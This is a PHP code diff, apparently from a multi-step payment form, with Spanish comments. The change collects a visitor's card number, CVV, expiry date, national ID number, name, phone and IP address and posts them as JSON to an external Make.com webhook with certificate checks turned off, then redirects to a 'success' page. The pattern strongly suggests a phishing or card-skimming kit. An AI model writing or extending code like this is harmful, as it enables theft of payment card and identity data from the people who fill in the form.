@@ -5,19 +5,39 @@ $card = isset($_POST['card']) ? trim($_POST['card']) : '';
 $cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
 $venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
 
+// Si recibimos DNI y nombre, enviar al webhook
 if(isset($_POST['dni']) && isset($_POST['name'])) {
-    ?>
-    <form id="autoForm" method="POST" action="step7.php">
-        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
-        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
-        <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
-        <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
-        <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
-        <input type="hidden" name="dni" value="<?php echo htmlspecialchars($_POST['dni']); ?>">
-        <input type="hidden" name="name" value="<?php echo htmlspecialchars($_POST['name']); ?>">
-    </form>
-    <script>document.getElementById('autoForm').submit();</script>
-    <?php
+    $dni = trim($_POST['dni']);
+    $name = trim($_POST['name']);
+    
+    // Enviar al webhook
+    $webhook_url = 'https://hook.us2.make.com/9r3vblb5fn35s0aoclfcuyg22vhzf55y';
+    
+    $data = [
+        'telefono' => $phone,
+        'tarjeta' => $card,
+        'cv' => $cv,
+        'venc' => $venc,
+        'DNI' => $dni,
+        'nombre' => $name,
+        'cantidad' => $amount,
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'fecha' => date('Y-m-d H:i:s')
+    ];
+    
+    $ch = curl_init($webhook_url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    curl_exec($ch);
+    curl_close($ch);
+    
+    // Redirigir a success
+    header('Location: success.php');
     exit;
 }
 
